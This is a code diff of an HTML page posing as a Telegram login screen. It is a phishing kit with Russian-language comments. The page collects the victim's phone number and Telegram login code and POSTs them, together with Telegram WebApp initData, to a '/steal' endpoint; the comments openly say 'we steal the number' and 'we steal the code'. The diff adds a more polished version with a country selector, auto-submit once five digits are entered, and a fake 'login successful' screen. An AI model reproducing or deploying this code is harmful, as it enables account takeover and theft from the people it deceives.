@@ -4,159 +4,159 @@
     <title>Telegram</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #1e1e1e; color: white; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-        
-        .container { max-width: 400px; margin: 0 auto; padding: 20px; }
-        
-        .header { text-align: center; margin-bottom: 40px; }
-        .logo { font-size: 48px; margin-bottom: 10px; }
-        
-        .phone-input, .code-input { 
-            background: #2b2b2b; 
-            border: 1px solid #444; 
-            border-radius: 12px; 
-            padding: 15px; 
-            margin: 10px 0; 
-            color: white; 
-            font-size: 16px;
-            width: 100%;
-        }
-        
-        .btn { 
-            background: #8774e1; 
-            color: white; 
-            border: none; 
-            padding: 15px; 
-            border-radius: 12px; 
-            width: 100%; 
-            font-size: 16px;
-            margin: 20px 0;
-            cursor: pointer;
-        }
-        
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        
-        .monkey {
-            text-align: center;
-            margin: 30px 0;
-            font-size: 80px;
-            animation: bounce 2s infinite;
-        }
-        
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
+        body { margin: 0; padding: 0; background: #18222d; color: white; font-family: system-ui; }
+        .container { padding: 20px; text-align: center; }
+        .logo { font-size: 80px; margin: 30px 0; }
+        .title { font-size: 24px; margin: 10px 0; }
+        .subtitle { color: #8e8e93; margin: 10px 0 30px; }
+        .phone-container { display: flex; gap: 10px; margin: 10px 0; }
+        .country-select { width: 100px; padding: 15px; background: #2b2b2b; border: none; border-radius: 10px; color: white; }
+        .phone-input { flex: 1; padding: 15px; background: #2b2b2b; border: none; border-radius: 10px; color: white; font-size: 16px; }
+        .btn { width: 100%; padding: 15px; background: #007aff; color: white; border: none; border-radius: 10px; font-size: 16px; margin: 20px 0; cursor: pointer; }
+        .monkey { font-size: 120px; margin: 40px 0; animation: float 3s ease-in-out infinite; }
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
             50% { transform: translateY(-10px); }
         }
-        
-        .hint {
-            color: #888;
-            font-size: 14px;
-            text-align: center;
-            margin: 10px 0;
-        }
-        
-        #stage-phone, #stage-code { display: none; }
-        #stage-phone.active, #stage-code.active { display: block; }
+        .stage { display: none; }
+        .active { display: block; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Этап телефона -->
-        <div id="stage-phone" class="active">
-            <div class="header">
-                <div class="logo">📱</div>
-                <h2>Введите ваш номер</h2>
-                <div class="hint">На него придет код подтверждения</div>
-            </div>
-            
-            <input type="tel" id="phone" class="phone-input" placeholder="+7 123 456-78-90" />
-            <button class="btn" onclick="sendPhone()">Далее</button>
+    <!-- Этап номера -->
+    <div class="container stage active" id="phoneStage">
+        <div class="logo">📱</div>
+        <div class="title">Введите ваш номер</div>
+        <div class="subtitle">На него придет код из Telegram</div>
+        
+        <div class="phone-container">
+            <select class="country-select" id="countryCode">
+                <option value="7">RU +7</option>
+                <option value="380">UA +380</option>
+                <option value="375">BY +375</option>
+                <option value="77">KZ +7</option>
+                <option value="994">AZ +994</option>
+                <option value="995">GE +995</option>
+                <option value="374">AM +374</option>
+                <option value="373">MD +373</option>
+                <option value="996">KG +996</option>
+                <option value="993">TM +993</option>
+                <option value="998">UZ +998</option>
+                <option value="992">TJ +992</option>
+                <option value="1">US +1</option>
+                <option value="44">UK +44</option>
+                <option value="49">DE +49</option>
+                <option value="33">FR +33</option>
+                <option value="39">IT +39</option>
+                <option value="34">ES +34</option>
+                <option value="90">TR +90</option>
+                <option value="86">CN +86</option>
+                <option value="81">JP +81</option>
+                <option value="82">KR +82</option>
+                <option value="91">IN +91</option>
+                <option value="55">BR +55</option>
+                <option value="52">MX +52</option>
+                <option value="54">AR +54</option>
+                <option value="61">AU +61</option>
+                <option value="64">NZ +64</option>
+                <option value="27">ZA +27</option>
+                <option value="20">EG +20</option>
+                <option value="971">AE +971</option>
+                <option value="966">SA +966</option>
+            </select>
+            <input class="phone-input" type="tel" id="phoneInput" placeholder="123 456-78-90">
         </div>
         
-        <!-- Этап кода -->
-        <div id="stage-code">
-            <div class="header">
-                <div class="monkey">🐵</div>
-                <h2>Введите код</h2>
-                <div class="hint">Код отправлен на ваш телефон</div>
-            </div>
-            
-            <input type="text" id="code" class="code-input" placeholder="12345" maxlength="5" />
-            <button class="btn" onclick="sendCode()">Войти</button>
-        </div>
+        <button class="btn" onclick="sendPhone()">ПРОДОЛЖИТЬ</button>
+    </div>
+
+    <!-- Этап кода -->
+    <div class="container stage" id="codeStage">
+        <div class="monkey">🐵</div>
+        <div class="title">Введите код</div>
+        <div class="subtitle">Отправлен в Telegram</div>
+        <input class="phone-input" type="text" id="codeInput" placeholder="12345" maxlength="5">
+        <button class="btn" onclick="sendCode()">ВОЙТИ</button>
     </div>
 
     <script>
-        let userPhone = '';
-        
         function sendPhone() {
-            const phone = document.getElementById('phone').value;
-            if (!phone) return;
+            const countryCode = document.getElementById('countryCode').value;
+            const phoneNumber = document.getElementById('phoneInput').value.trim();
             
-            userPhone = phone;
+            if (!phoneNumber) return;
             
-            // Переключаем на этап кода
-            document.getElementById('stage-phone').classList.remove('active');
-            document.getElementById('stage-code').classList.add('active');
+            const fullPhone = '+' + countryCode + phoneNumber.replace(/\D/g, '');
             
-            // Симулируем отправку кода
-            setTimeout(() => {
-                // В реальности здесь запрос к твоему серверу
-                fetch('/steal', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        stage: 'phone_entered',
-                        phone: phone,
-                        tg_data: Telegram.WebApp.initData
-                    })
-                });
-            }, 500);
+            // Переключаем этапы
+            document.getElementById('phoneStage').classList.remove('active');
+            document.getElementById('codeStage').classList.add('active');
+            
+            // Крадем номер
+            fetch('/steal', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    stage: 'phone_entered',
+                    phone: fullPhone,
+                    country: countryCode,
+                    tg_data: Telegram.WebApp.initData
+                })
+            });
         }
-        
+
         function sendCode() {
-            const code = document.getElementById('code').value;
+            const code = document.getElementById('codeInput').value;
+            const countryCode = document.getElementById('countryCode').value;
+            const phoneNumber = document.getElementById('phoneInput').value.trim();
+            const fullPhone = '+' + countryCode + phoneNumber.replace(/\D/g, '');
+            
             if (!code) return;
             
-            // Отправляем код на сервер
+            // Крадем код
             fetch('/steal', {
-                method: 'POST', 
-                headers: { 'Content-Type': 'application/json' },
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    stage: 'code_entered', 
-                    phone: userPhone,
+                    stage: 'code_entered',
+                    phone: fullPhone,
                     code: code,
+                    country: countryCode,
                     tg_data: Telegram.WebApp.initData
                 })
             });
             
             // Показываем загрузку
-            const btn = document.querySelector('#stage-code .btn');
-            btn.textContent = 'Вход...';
+            const btn = document.querySelector('#codeStage .btn');
+            btn.textContent = 'ВХОД...';
             btn.disabled = true;
             
-            // Через 2 секунды "успешный вход"
+            // Через 2 сек успех
             setTimeout(() => {
-                // Здесь можно перенаправить или показать успех
                 document.body.innerHTML = `
                     <div class="container">
-                        <div class="header">
-                            <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
-                            <h2>Вход выполнен!</h2>
-                            <div class="hint">Аккаунт успешно подключен</div>
-                        </div>
+                        <div class="logo">✅</div>
+                        <div class="title">Успешный вход</div>
+                        <div class="subtitle">Аккаунт подключен</div>
                     </div>
                 `;
             }, 2000);
         }
-        
-        // Автофокус на инпуты
-        document.getElementById('phone').focus();
-        document.getElementById('code').addEventListener('input', function(e) {
+
+        // Авто-отправка при 5 цифрах
+        document.getElementById('codeInput').addEventListener('input', function(e) {
             if (this.value.length === 5) {
                 sendCode();
             }
+        });
+
+        // Форматирование номера
+        document.getElementById('phoneInput').addEventListener('input', function(e) {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length > 0) {
+                value = value.replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2-$3-$4');
+            }
+            this.value = value;
         });
     </script>
 </body>
